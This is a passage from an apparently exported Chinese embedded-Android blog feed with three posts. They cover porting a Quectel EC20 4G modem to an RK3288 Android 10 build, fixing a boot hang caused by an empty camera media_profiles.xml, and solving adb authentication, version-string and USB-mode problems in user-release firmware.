property:persist.internet_adb_enable=0     restart adbd # for telephony function-on property:ro.boot.noril=true-    setprop ro.radio.noril true-    stop ril-daemon+on property:ro.boot.noril=false+    setprop ro.radio.noril false+    start ril-daemon</code></pre><h4 id="manifest-ab-xml"><a href="#manifest-ab-xml" class="headerlink" title="manifest_ab.xml"></a>manifest_ab.xml</h4><ul><li><strong><code>device/rockchip/rk3288/manifest_ab.xml</code></strong></li></ul><p>在 <code>manifest_ab.xml</code> 或者 <code>manifest.xml</code> 中添加两条 <code>hidl</code> 记录，这是 <code>android 8</code> 及高版本所需的。当然，不改文件，直接使用 <code>4g_modem</code> 目录的也可以。</p><pre><code class="bash">--- a/manifest_ab.xml+++ b/manifest_ab.xml@@ -183,5 +183,23 @@             &lt;instance&gt;default&lt;/instance&gt;         &lt;/interface&gt;     &lt;/hal&gt;+    &lt;hal format=&quot;hidl&quot;&gt;+        &lt;name&gt;android.hardware.radio.deprecated&lt;/name&gt;+        &lt;transport&gt;hwbinder&lt;/transport&gt;+        &lt;version&gt;1.0&lt;/version&gt;+        &lt;interface&gt;+            &lt;name&gt;IOemHook&lt;/name&gt;+            &lt;instance&gt;slot1&lt;/instance&gt;+        &lt;/interface&gt;+    &lt;/hal&gt;+    &lt;hal format=&quot;hidl&quot;&gt;+        &lt;name&gt;android.hardware.radio&lt;/name&gt;+        &lt;transport&gt;hwbinder&lt;/transport&gt;+        &lt;version&gt;1.0&lt;/version&gt;+        &lt;interface&gt;+            &lt;name&gt;IRadio&lt;/name&gt;+            &lt;instance&gt;slot1&lt;/instance&gt;+        &lt;/interface&gt;+    &lt;/hal&gt; &lt;/manifest&gt; </code></pre><h4 id="EC20-files"><a href="#EC20-files" class="headerlink" title="EC20 files"></a>EC20 files</h4><ul><li><strong><code>device/rockchip/rk3288/rk3288_Android/EC20/</code></strong></li></ul><p>将 <code>quectel</code> 提供的文件拷贝至以下目录。</p><pre><code class="bash">$ ls device/rockchip/rk3288/rk3288_Android10/EC20 chat  ip-down  ip-up  libreference-ril.so</code></pre><ul><li><strong><code>device/rockchip/rk3288/rk3288_Android10/rk3288_Android10.mk</code></strong></li></ul><p>在 <code>rk3288_Android10.mk</code> 文件中添加拷贝项 <code>PRODUCT_COPY_FILES</code> , 将前面的4个文件拷贝至指定目录。</p><pre><code class="bash">--- a/rk3288_Android10/rk3288_Android10.mk+++ b/rk3288_Android10/rk3288_Android10.mk@@ -43,6 +43,10 @@ PRODUCT_PACKAGES += \ PRODUCT_COPY_FILES += vendor/rockchip/common/phone/etc/apns-full-conf.xml:system/etc/apns-conf.xml PRODUCT_COPY_FILES += vendor/rockchip/common/phone/etc/spn-conf.xml:system/etc/spn-conf.xml PRODUCT_COPY_FILES += $&#123;TARGET_DEVICE_DIR&#125;/user_service.sh:system/bin/user_service.sh+PRODUCT_COPY_FILES += $&#123;TARGET_DEVICE_DIR&#125;/EC20/chat:system/bin/chat+PRODUCT_COPY_FILES += $&#123;TARGET_DEVICE_DIR&#125;/EC20/ip-down:system/etc/ppp/ip-down+PRODUCT_COPY_FILES += $&#123;TARGET_DEVICE_DIR&#125;/EC20/ip-up:system/etc/ppp/ip-up+PRODUCT_COPY_FILES += $&#123;TARGET_DEVICE_DIR&#125;/EC20/libreference-ril.so:vendor/lib/libreference-ril.so PRODUCT_PROPERTY_OVERRIDES += \     ro.product.version = 1.0.0 \     ro.product.ota.host = www.rockchip.com:2300 \</code></pre><h4 id="sepolicy"><a href="#sepolicy" class="headerlink" title="sepolicy"></a>sepolicy</h4><p>添加 <code>sepolicy</code> 权限，这里只是示例，具体情况需要根据日志进行添加。</p><ul><li><strong><code>device/rockchip/common/sepolicy/vendor/file_contexts</code></strong></li></ul><pre><code class="c">--- a/sepolicy/vendor/file_contexts+++ b/sepolicy/vendor/file_contexts@@ -1,5 +1,6 @@ /dev/ttyFIQ[0-9]*    u:object_r:serial_device:s0-/dev/ttyUSB[0-9]*    u:object_r:tty_device:s0+/dev/ttyUSB[0-3]     u:object_r:radio_device:s0+/dev/ttyUSB[4-9]     u:object_r:tty_device:s0 /dev/mali[0-9]       u:object_r:gpu_device:s0 /dev/mali            u:object_r:gpu_device:s0 /dev/ddr_freq        u:object_r:ddr_device:s0@@ -193,3 +194,7 @@ #flash_img /system/bin/flash_img.sh u:object_r:install_recovery_exec:s0++#rild+/vendor/bin/hw/rild         u:object_r:rild_exec:s0+/dev/socket/rildOemHook     u:object_r:rild_socket:s0</code></pre><h3 id="hardware"><a href="#hardware" class="headerlink" title="hardware"></a>hardware</h3><h4 id="ril"><a href="#ril" class="headerlink" title="ril"></a>ril</h4><ul><li><strong><code>hardware/ril/reference-ril/</code></strong></li></ul><p>由于使用 <code>quectel</code> 提供的 <code>libreference-ril.so</code>, 所以需要禁用 <code>SDK</code> 自带的 <code>reference-ril</code>, 将对应目录下的 <code>Android.mk</code> 重命名即可。</p><pre><code class="bash">cd hardware/ril/reference-rilgit mv Android.mk Android.mk_bak</code></pre><h4 id="rild"><a href="#rild" class="headerlink" title="rild"></a>rild</h4><ul><li><strong><code>hardware/ril/rild/rild.rc</code></strong></li></ul><p><code>rk3288 android10</code> 的 <code>ril-daemon</code> 定义于 <code>rild.rc</code> 文件中，为了使用 <code>quectel</code> 提供的 <code>libreference-ril.so</code> ，需要修改该文件。</p><pre><code class="c">--- a/rild/rild.rc+++ b/rild/rild.rc@@ -1,5 +1,5 @@-service vendor.ril-daemon /vendor/bin/hw/rild+service ril-daemon /vendor/bin/hw/rild -l /vendor/lib/libreference-ril.so     class main                                                                                                                user radio                                                                                                           -    group radio cache inet misc audio log readproc wakelock+    group radio cache inet misc audio log readproc wakelock sdcard_rw     capabilities BLOCK_SUSPEND NET_ADMIN NET_RAW</code></pre><h3 id="external"><a href="#external" class="headerlink" title="external"></a>external</h3><ul><li><strong><code>external/ppp/chat</code></strong></li></ul><p>由于使用 <code>quectel</code> 提供的 <code>chat</code>, 所以需要禁用SDK自带的 <code>chat</code> , 简单将自带 <code>chat</code> 目录的 <code>Android.mk</code> 重命名即可，这样编译时就检索不到了。</p><pre><code class="bash">cd external/ppp/chatgit mv Android.mk Android.mk_bak</code></pre><h2 id="查看信息"><a href="#查看信息" class="headerlink" title="查看信息"></a>查看信息</h2><p>系统配置好并烧录后，查看相关信息。</p><pre><code class="bash">console:/ # ifconfigppp0      Link encap:Point-to-Point Protocol          inet addr:10.167.182.79  P-t-P:10.64.64.64  Mask:255.255.255.255          UP POINTOPOINT RUNNING NOARP MULTICAST  MTU:1500  Metric:1          RX packets:20 errors:0 dropped:0 overruns:0 frame:0          TX packets:82 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:3          RX bytes:1989 TX bytes:5010console:/ # ping baidu.comPING baidu.com (220.181.38.148) 56(84) bytes of data.64 bytes from 220.181.38.148: icmp_seq=1 ttl=45 time=111 ms64 bytes from 220.181.38.148: icmp_seq=2 ttl=45 time=114 ms64 bytes from 220.181.38.148: icmp_seq=3 ttl=45 time=117 ms64 bytes from 220.181.38.148: icmp_seq=4 ttl=45 time=115 msconsole:/ # ls /dev/ttyUSB*/dev/ttyUSB0 /dev/ttyUSB1 /dev/ttyUSB2 /dev/ttyUSB3console:/ # dmesg |grep GSM[    1.363745] usbserial: USB Serial support registered for GSM modem (1-port)[   10.353990] option 3-1.2:1.0: GSM modem (1-port) converter detected[   10.354280] usb 3-1.2: GSM modem (1-port) converter now attached to ttyUSB0[   10.360191] option 3-1.2:1.1: GSM modem (1-port) converter detected[   10.360825] usb 3-1.2: GSM modem (1-port) converter now attached to ttyUSB1[   10.362188] option 3-1.2:1.2: GSM modem (1-port) converter detected[   10.362542] usb 3-1.2: GSM modem (1-port) converter now attached to ttyUSB2[   10.363543] option 3-1.2:1.3: GSM modem (1-port) converter detected[   10.364808] usb 3-1.2: GSM modem (1-port) converter now attached to ttyUSB3console:/ # microcom -s 115200 /dev/ttyUSB2+CSQ: 23,99OKQuectelEC20FRevision: EC20CNHDLGR09A06M1G</code></pre><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>如果使用 <code>USB Serial</code> 模式，记得禁用 <code>qmi_wwan</code> 驱动，否则会自动生成 <code>wwan0</code>, 且影响 pppd 拨号上网。</li><li>记得查看 <code>rild</code> 中是否有 <code>rild.rc</code> ，如果有且定义了 <code>ril-daemon</code>, 则无需在 <code>init.*.rc</code> 中定义了</li><li><code>rild.libpath</code> , <code>rild.libargs</code> 需要与 <code>rild</code> 中使用的匹配，如果不确定，<code>vendor.rild.libpath</code>, <code>vendor.rild.libargs</code> 也加上。</li><li>在 <code>android10</code> 中，需要将 <code>libreference-ril.so</code> 放置在 <code>vendor</code> 目录，而非 <code>system</code> 目录</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><code>Quectel_WCDMA&amp;LTE_Linux_USB_Driver_User_Guide_V1.8.pdf</code></li><li><code>Quectel_Android_RIL_Driver_User_Guide_V1.9.pdf</code></li><li><a href="https://blog.csdn.net/fhy00229390/article/details/108757338">4G模块 EC20 R2.0 USB Serial/GobiNet/QMI WWAN 驱动移植过程</a></li><li><a href="https://blog.csdn.net/rendong_yang/article/details/102912589">Android 4G上网流程分析</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
            <tag> rk3288 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3288 android 6.0 卡死在开机logo画面问题处理</title>
      <link href="2022/01/11/rk3288-hang/"/>
      <url>2022/01/11/rk3288-hang/</url>
      
        <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>烧录固件后，会概率性出现卡死在开机画面无法启动的问题，但是烧录新固件后会恢复正常。对比不同机型，发现只有带<strong>摄像头功能</strong>的机型会有这个问题。</p><h2 id="Root-cause"><a href="#Root-cause" class="headerlink" title="Root cause"></a>Root cause</h2><p>经过大量测试和排查，发现卡死问题源自一个文件,  <code>/data/camera/media_profiles.xml</code> , 这是一个空文件，删除后系统就正常启动了。</p><p>通过使用 <code>logcat</code> 结合系统源码发现，该文件是摄像头配置文件，如果为空会导致系统循环检测该文件，并尝试从中获取摄像头配置，但是由于文件为空，导致一直获取失败，最后陷入死循环。</p><pre><code class="bash">$ cd /data/camera$ lsmedia_profiles.xml</code></pre><p>经过排查源码，发现系统在检查到有摄像头接入后，会将默认配置文件 <code>/etc/media_profiles_default.xml</code> 拷贝至 <code>/data/camera/media_profiles_tmp.xml</code>, 然后根据实际情况修改该tmp文件，并最终写入到 <code>/data/camera/media_profiles.xml</code> 文件中。相关函数 <code>ProduceNewXml</code>如下:</p><pre><code class="c">// hardware/rockchip/camera/CameraHal/CameraHal_board_xml_parse.cppint camera_board_profiles::ProduceNewXml(camera_board_profiles* profiles)&#123;     char temp_dst_file[50];     char dst_file[50];     char default_file[50];     int err=0;     int res=0;     //CheckSensorSupportDV     AddConnectSensorToVector(profiles);     size_t nCamNum =profiles-&gt;mDevideConnectVector.size();     //verrify media_xml_device is supported by board xml     for(int i=0; (i&lt;profiles-&gt;xml_device_count &amp;&amp; i&lt;2); i++)     &#123;         res |= ConnectDevHaveDev(profiles, (profiles-&gt;mXmlDevInfo + i));     &#125;     if(res == RK_RET_SUCCESS &amp;&amp; profiles-&gt;xml_device_count==(int)nCamNum)&#123;         return RK_RET_SUCCESS;     &#125;     int fileexit = access(RK_DST_MEDIA_PROFILES_XML_PATH, 0);     ALOGD(&quot;judge the media profile xml fileexit = %d\n&quot;, fileexit);     //if((int)nCamNum&gt;=1)&#123;     if((int)nCamNum&gt;=1 &amp;&amp; fileexit == -1)&#123;         LOG1(&quot;enter produce new xml\n&quot;);         //new xml file name         strlcpy(default_file, RK_DEFAULT_MEDIA_PROFILES_XML_PATH, sizeof(default_file));         strlcpy(dst_file, RK_DST_MEDIA_PROFILES_XML_PATH, sizeof(dst_file));         strlcpy(temp_dst_file, RK_TMP_MEDIA_PROFILES_XML_PATH, sizeof(temp_dst_file));         for(int i=0; i&lt;(int)nCamNum; i++)&#123;             CheckSensorSupportDV(profiles-&gt;mDevideConnectVector[i]);         &#125;         //write name to xml         err = WriteDevNameTOXML(profiles, default_file, temp_dst_file);         if(err)&#123;             ALOGE(&quot;write dev name to xml failed\n&quot;);             goto end;         &#125;         //modify xml         err = ModifyMediaProfileXML( profiles, temp_dst_file, dst_file);         if(err)&#123;             ALOGE(&quot;modify xml failed\n&quot;);             goto end;         &#125;         LOG1(&quot;exit produce new xml\n&quot;);         &#125; end:     return err;&#125;</code></pre><p>其中使用了宏定义变量，定义如下：</p><pre><code class="c">//  hardware/rockchip/camera/CameraHal/CameraHal_board_xml_parse.h#define RK_DEFAULT_MEDIA_PROFILES_XML_PATH &quot;/etc/media_profiles_default.xml&quot;#if defined(ANDROID_5_X)#define RK_DST_MEDIA_PROFILES_XML_PATH &quot;/data/camera/media_profiles.xml&quot;#define RK_TMP_MEDIA_PROFILES_XML_PATH &quot;/data/camera/media_profiles_tmp.xml&quot;#else#define RK_DST_MEDIA_PROFILES_XML_PATH &quot;/data/media_profiles.xml&quot;#define RK_TMP_MEDIA_PROFILES_XML_PATH &quot;/data/media_profiles_tmp.xml&quot;#endif</code></pre><p>至于为何会出现该空文件，有可能是在写入过程中掉电导致的，但是目前没有重现。</p><h2 id="reproduce"><a href="#reproduce" class="headerlink" title="reproduce"></a>reproduce</h2><p>手动重现的方法比较简单，就是新建一个空文件 <code>data/camera/media_profiles.xml</code>, 新建后无论什么机型都会卡死在logo界面，这个bug应该是系统原生就有的。</p><pre><code class="bash">cd /data/camera/touch media_profiles.xml</code></pre><h2 id="related"><a href="#related" class="headerlink" title="related"></a>related</h2><h3 id="files"><a href="#files" class="headerlink" title="files"></a>files</h3><p>相关文件如下：</p><pre><code class="bash"># line 676 MediaProfiles::getInstanceframeworks/av/media/libmedia/MediaProfiles.cpphardware/rockchip/camera/CameraHal/*hardware/rockchip/camera/CameraHal/CameraHal_board_xml_parse.hhardware/rockchip/camera/CameraHal/CameraHal_MediaProfile.cpp# int camera_board_profiles::LoadSensor(camera_board_profiles* profiles)# 01-10 16:08:27.266   205   205 D CameraHal: read cam name from xml(/data/camera/media_profiles.xml)hardware/rockchip/camera/CameraHal/CameraHal_board_xml_parse.cpp</code></pre><pre><code class="bash">$ cd /media/hdd1/wugt/rk3288-android6.0-sdk/out/target/product/rk3288  $ grep -rn media_profiles.xmlBinary file obj/lib/camera.rk30board.so matchesBinary file obj/lib/libmedia.so matchesBinary file obj/PACKAGING/systemimage_intermediates/system.img matchesBinary file obj/SHARED_LIBRARIES/camera.rk30board_intermediates/LINKED/camera.rk30board.so matchesBinary file obj/SHARED_LIBRARIES/camera.rk30board_intermediates/PACKED/camera.rk30board.so matchesBinary file obj/SHARED_LIBRARIES/camera.rk30board_intermediates/CameraHal_board_xml_parse.o matchesBinary file obj/SHARED_LIBRARIES/camera.rk30board_intermediates/CameraHal_Module.o matchesBinary file obj/SHARED_LIBRARIES/libmedia_intermediates/LINKED/libmedia.so matchesBinary file obj/SHARED_LIBRARIES/libmedia_intermediates/PACKED/libmedia.so matchesBinary file obj/SHARED_LIBRARIES/libmedia_intermediates/MediaProfiles.o matchesBinary file system.img matchesBinary file system/lib/hw/camera.rk30board.so matchesBinary file system/lib/libmedia.so matchesBinary file symbols/system/lib/hw/camera.rk30board.so matchesBinary file symbols/system/lib/libmedia.so matches</code></pre><h3 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h3><p>相关log如下：</p><pre><code class="bash">130|root@rk3288:/ # logcat  |grep profile &amp;[1] 1070 1071root@rk3288:/ # 01-07 11:08:57.330   205   205 E CameraHal: camera_get_number_of_cameras(695): board profiles cam num 701-07 11:08:57.330   205   205 D CameraHal: read cam name from xml(/data/camera/media_profiles.xml)01-07 11:08:57.352   205   205 D CameraHal: camera_get_number_of_cameras(1146): meida_profiles_xml_control time (43839)us01-07 11:08:59.981   171   171 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:08:59.982   171   171 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml01-07 11:09:01.087   543   543 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:09:01.088   543   543 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml01-07 11:09:06.287   558   558 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:09:06.287   558   558 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml01-07 11:09:11.466   584   584 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:09:11.466   584   584 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml01-07 11:09:15.695   610   610 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:09:15.695   610   610 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml01-07 11:09:20.920   636   636 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:09:20.920   636   636 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml01-07 11:09:26.222   671   671 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:09:26.222   671   671 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml01-07 11:09:31.403   696   696 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:09:31.403   696   696 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml01-07 11:09:35.640   725   725 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:09:35.640   725   725 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml01-07 11:09:40.841   748   748 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:09:40.841   748   748 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml01-07 11:09:46.009   770   770 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:09:46.009   770   770 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml01-07 11:09:51.775   797   797 E CameraHal: camera_get_number_of_cameras(695): board profiles cam num 701-07 11:09:51.775   797   797 D CameraHal: read cam name from xml(/data/camera/media_profiles.xml)01-07 11:09:51.782   797   797 D CameraHal: camera_get_number_of_cameras(1146): meida_profiles_xml_control time (21590)usroot@rk3288:/ #root@rk3288:/ #root@rk3288:/ # cd /data/camera/root@rk3288:/data/camera #root@rk3288:/data/camera # 01-07 11:10:18.581   794   794 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:10:18.581   794   794 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xml[   85.094068] init: couldn&#39;t write 0 to /dev/cpuset/foreground/tasks: No such file or directory01-07 11:10:19.342  1079  1079 E CameraHal: camera_get_number_of_cameras(695): board profiles cam num 701-07 11:10:19.342  1079  1079 D CameraHal: read cam name from xml(/data/camera/media_profiles.xml)01-07 11:10:19.350  1079  1079 D CameraHal: camera_get_number_of_cameras(1146): meida_profiles_xml_control time (21315)usroot@rk3288:/data/camera # 01-07 11:10:19.861  1077  1077 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:10:19.861  1077  1077 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xmlroot@rk3288:/data/camera #root@rk3288:/data/camera # [   90.250059] init: couldn&#39;t write 0 to /dev/cpuset/foreground/tasks: No such file or directory01-07 11:10:24.556  1207  1207 D CameraHal: camera_get_number_of_cameras(1146): meida_profiles_xml_control time (20242)us01-07 11:10:25.081  1208  1208 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:10:25.081  1208  1208 D MediaProfiles: getInstance(713): Create instance from /data/camera/media_profiles.xmlroot@rk3288:/data/camera #root@rk3288:/data/camera #root@rk3288:/data/camera # rm media_profiles.xmlroot@rk3288:/data/camera # [   95.425765] init: couldn&#39;t write 0 to /dev/cpuset/foreground/tasks: No such file or directory01-07 11:10:29.853  1343  1343 E CameraHal: camera_get_number_of_cameras(695): board profiles cam num 701-07 11:10:29.853  1343  1343 D CameraHal: read cam name from xml(/data/camera/media_profiles.xml)01-07 11:10:29.860  1343  1343 D CameraHal: camera_get_number_of_cameras(1146): meida_profiles_xml_control time (22146)us01-07 11:10:30.372  1344  1344 D MediaProfiles: CameraGroupFound(618): media_profiles_id: 0x001-07 11:10:30.372  1344  1344 E MediaProfiles: WARNING!!!! getInstance(689): cameraHal version(1.65.1) after(0.3.0x33),but don&#39;t have file(/data/camera/media_profiles.xml)[  116.602227] healthd: battery l=100 v=0 t=42.4 h=2 st=2 chg=a 2022-01-07 03:10:50.769561638 UTC[  116.814715] lowmemorykiller: lowmem_shrink: convert oom_adj to oom_score_adj:[  116.814743] lowmemorykiller: oom_adj 0 =&gt; oom_score_adj 0[  116.814754] lowmemorykiller: oom_adj 1 =&gt; oom_score_adj 58[  116.814764] lowmemorykiller: oom_adj 2 =&gt; oom_score_adj 117[  116.814773] lowmemorykiller: oom_adj 3 =&gt; oom_score_adj 176[  116.814803] lowmemorykiller: oom_adj 9 =&gt; oom_score_adj 529[  116.814813] lowmemorykiller: oom_adj 15 =&gt; oom_score_adj 1000</code></pre><h2 id="workaround"><a href="#workaround" class="headerlink" title="workaround"></a>workaround</h2><p>临时解决方案：在出现问题后通过 <code>adb</code>指令删除文件 <code>/data/camera/media_profiles.xml</code>, 或者使用默认配置文件覆盖它。</p><pre><code class="bash">cd /data/camerarm media_profiles.xml# orcp /etc/media_profiles_default.xml /data/camera/</code></pre><h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h2><p>最终解决方案，就是在检查到 <code>/data/camera/media_profiles.xml</code> 后，查看文件大小，如果为空或者小于某个值，则认为该文件异常，将其删除。</p><pre><code class="c">diff --git a/media/libmedia/MediaProfiles.cpp b/media/libmedia/MediaProfiles.cppindex fe0126a..3258b71 100755--- a/media/libmedia/MediaProfiles.cpp+++ b/media/libmedia/MediaProfiles.cpp@@ -688,6 +688,17 @@ MediaProfiles::getInstance()                             ALOGE(&quot;WARNING!!!! %s(%d): cameraHal version(%s) after(0.3.0x33),but don&#39;t have file(%s)&quot;,                                      __FUNCTION__,__LINE__,camerahal_value,defaultXmlFile);                         &#125;+                        else &#123;+                            fseek(fp, 0L, SEEK_END);+                            int size = ftell(fp);++                            if (size &lt; 1000) &#123;+                                ALOGE(&quot;WARNING!!!! %s(%d): file(%s) size(%d) is too small, delete it&quot;,+                                       __FUNCTION__,__LINE__,defaultXmlFile,size);+                                fp = NULL;+                                remove(defaultXmlFile);+                            &#125;+                        &#125;                     &#125; else &#123;                         if (fp == NULL)                             ALOGD(&quot;THIS IS RIGHT: %s(%d): cameraHal version(%s) before(0.3.33),so don&#39;t have file(%s)&quot;,</code></pre><p>删除后，系统能够正常启动，并且在下次启动后，会自动生成新文件。</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
            <tag> rk3288 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3288 android 6.0 user release 相关问题处理</title>
      <link href="2021/12/31/rk3288-security/"/>
      <url>2021/12/31/rk3288-security/</url>
      
        <content type="html"><![CDATA[<p>之前一直用的 <code>userdebug</code> 版本，默认 <code>adb root</code> 或者使用 <code>su</code> 即可获取 root 权限。目前基于安全考虑，固件发布需要使用 <code>user</code> 版本配置，很多功能都需要重新测试，下面对 <code>RK3288</code> <code>user</code> 发布版本遇到的问题进行总结。</p><h2 id="编译固件"><a href="#编译固件" class="headerlink" title="编译固件"></a>编译固件</h2><p>首先是编译固件，将原先的 <code>rk3288-userdebug</code> 改为 <code>rk3288-user</code>.</p><pre><code class="bash">./FFTools/make.sh -d rk3288-tb_8846 -j16 -l rk3288-user./FFTools/mkupdate/mkupdate.sh -l rk3288-user</code></pre><p>下面是 firefly 官方 wiki 文档对 <code>user</code>, <code>userdebug</code>, <code>eng</code> 版本的对比。</p><blockquote><h3 id="构建变体说明"><a href="#构建变体说明" class="headerlink" title="构建变体说明"></a>构建变体说明</h3><p>默认的目标构建变体(TARGET_BUILD_VARIANT)为 userdebug。常用变体有三种，分别是用户(user)、用户调试(userdebug)和工程模式(eng)，其区别如下：</p><ul><li>user<ul><li>仅安装标签为 user 的模块</li><li>设定属性 ro.secure=1，打开安全检查功能</li><li>设定属性 ro.debuggable=0，关闭应用调试功能</li><li>默认关闭 adb 功能</li><li>打开 Proguard 混淆器</li><li>打开 DEXPREOPT 预先编译优化</li></ul></li><li>userdebug<ul><li>安装标签为 user、debug 的模块</li><li>设定属性 ro.secure=1，打开安全检查功能</li><li>设定属性 ro.debuggable=1，启用应用调试功能</li><li>默认打开 adb 功能</li><li>打开 Proguard 混淆器</li><li>打开 DEXPREOPT 预先编译优化</li></ul></li><li>eng<ul><li>安装标签为 user、debug、eng 的模块</li><li>设定属性 ro.secure=0，关闭安全检查功能</li><li>设定属性 ro.debuggable=1，启用应用调试功能</li><li>设定属性 ro.kernel.android.checkjni=1，启用 JNI 调用检查</li><li>默认打开 adb 功能</li><li>关闭 Proguard 混淆器</li><li>关闭 DEXPREOPT 预先编译优化</li></ul></li></ul><p>如果目标构建变体为 user，则 adb 无法获取 root 权限。</p></blockquote><p>从以上说明可知，<code>user</code> 版本无法通过 <code>adb</code> 获取 root 权限，这个先不管，下面来看看我遇到了哪些问题。</p><h2 id="adb-shell-fail"><a href="#adb-shell-fail" class="headerlink" title="adb shell fail"></a>adb shell fail</h2><p>首先遇到的是 <code>adb shell</code> 失败，windows 和 ubuntu系统都测试失败。</p><ul><li> ubuntu 执行 <code>adb shell</code></li></ul><pre><code class="bash">$ adb shellerror: device unauthorized.This adb server&#39;s $ADB_VENDOR_KEYS is not setTry &#39;adb kill-server&#39; if that seems wrong.Otherwise check for a confirmation dialog on your device.</code></pre><ul><li>windows 执行 <code>adb shell</code></li></ul><pre><code class="bash">C:\Users\EDY&gt;adb shellerror: device unauthorized. Please check the confirmation dialog on your device.</code></pre><p>提示信息类似，都是未认证，对比正常情况，手机插入电脑，然后打开调试功能是会弹出秘钥认证的，而 <code>rk3288</code> 系统没有弹框提示秘钥相关信息。最后排查发现是 <code>ro.adb.secure</code> 默认配置为0了，这个是 <code>userdebug</code> 版本中添加的，代表不需要通过认证，可以直接访问系统，但是这个在 <code>user</code> 版本是行不通的，所以需要把它改成1.</p><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p>修改  <code>build/core/main.mk</code>, 启用debug和adb认证功能。</p><pre><code class="bash">diff --git a/core/main.mk b/core/main.mkindex aa617c3..a0b783d 100644--- a/core/main.mk+++ b/core/main.mk@@ -361,9 +361,11 @@ ifeq (true,$(strip $(enable_target_debugging)))   INCLUDE_TEST_OTA_KEYS := true else # !enable_target_debugging   # Target is less debuggable and adbd is off by default-  ADDITIONAL_DEFAULT_PROPERTIES += ro.debuggable=0+  ADDITIONAL_DEFAULT_PROPERTIES += ro.debuggable=1 endif # !enable_target_debugging +ADDITIONAL_DEFAULT_PROPERTIES += ro.adb.secure=1+ ## eng ##  ifeq ($(TARGET_BUILD_VARIANT),eng)</code></pre><p>对于 <code>ro.adb.secure</code> , 也可以通过修改 <code>device/rockchip/rk3288/system.prop</code> 实现。</p><pre><code class="bash">ro.adb.secure=1</code></pre><h2 id="fw-version"><a href="#fw-version" class="headerlink" title="fw version"></a>fw version</h2><p>release 版本的版本号显示如下，对应 <code>ro.build.display.id</code> ，为了和之前的版本号保持一致，需要更新。</p><pre><code class="bash">MXC89K release-keys</code></pre><h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution"></a>solution</h3><p>更新方式也简单，之前 <code>userdebug</code> 使用的是 <code>$(build_desc)</code>, 所以在 user 版本的编译配置参数中也改为 <code>$(build_desc)</code>.</p><pre><code class="bash">--- a/core/Makefile+++ b/core/Makefile@@ -165,7 +165,7 @@ ifeq ($(TARGET_BUILD_VARIANT),user)   ifeq &quot;true&quot; &quot;$(DISPLAY_BUILD_NUMBER)&quot;     BUILD_DISPLAY_ID := $(BUILD_ID).$(BUILD_NUMBER) $(BUILD_KEYS)   else-    BUILD_DISPLAY_ID := $(BUILD_ID) $(BUILD_KEYS)+    BUILD_DISPLAY_ID := $(build_desc)   endif else   # Non-user builds should show detailed build information</code></pre><h2 id="change-usb-mode-fail"><a href="#change-usb-mode-fail" class="headerlink" title="change usb mode fail"></a>change usb mode fail</h2><p>使用 user release 版本后，USB 模式无法修改了，一直保持在 Device 模式。修改触发的错误信息如下：</p><pre><code class="bash">[   54.422452] type=1400 audit(1640315085.300:22): avc: denied &#123; write &#125; for pid=601 comm=&quot;ndroid.systemui&quot; name=&quot;force_usb_mode&quot; dev=&quot;sysfs&quot; ino=12816 scontext=u:r:platform_app:s0:c512,c768 tcontext=u:object_r:sysfs:s0 tclass=file permissive=0[   54.466011] init: avc:  denied  &#123; set &#125; for property=persist.usb.mode scontext=u:r:system_app:s0 tcontext=u:object_r:default_prop:s0 tclass=property_service[   54.466052] init: sys_prop: permission denied uid:1000  name:persist.usb.mode[   57.748360] type=1400 audit(1640315088.680:23): avc: denied &#123; write &#125; for pid=601 comm=&quot;ndroid.systemui&quot; name=&quot;force_usb_mode&quot; dev=&quot;sysfs&quot; ino=12816 scontext=u:r:platform_app:s0:c512,c768 tcontext=u:object_r:sysfs:s0 tclass=file permissive=0[   57.750643] init: avc:  denied  &#123; set &#125; for property=persist.usb.mode scontext=u:r:system_app:s0 tcontext=u:object_r:default_prop:s0 tclass=property_service[   57.750696] init: sys_prop: permission denied uid:1000  